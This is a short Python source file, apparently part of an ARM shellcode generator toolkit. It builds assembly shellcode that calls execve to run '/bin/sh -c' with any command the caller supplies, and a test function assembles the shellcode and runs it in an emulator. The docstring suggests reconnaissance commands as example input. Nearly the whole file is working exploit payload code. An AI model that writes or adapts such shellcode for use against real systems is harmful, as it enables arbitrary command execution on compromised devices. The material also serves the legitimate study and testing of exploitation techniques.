# /bin/sh 
def generate(cmd='echo hack_the_planet'):
    """Executes /bin/sh with arguments

    Args:
        cmd(str): arguments (default: ``echo "hack the planet"``)
                  for example: "uname -a; ps auxwww; netstat -an"
    """
    sc = """
    adr r0, bin_sh_1
    adr r5, opt_1
    adr r6, cmd_1
    mov r8, #0
    push {r0, r5, r6, r8}
    mov r1, sp
    mov r2, #0
    movw r7, #11
    svc 0
bin_sh_1:
    .asciz "/bin/sh"
opt_1:
    .asciz "-c"
cmd_1:
    .asciz "%s"
    """ % (cmd) 
    return sc

def testcase(cmd='echo hack_the_planet'):
    import ARMSCGen as scgen
    sc = scgen.ks_asm('arm', generate(cmd))[0]
    sclen = sc.find(cmd)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_ARM, False)
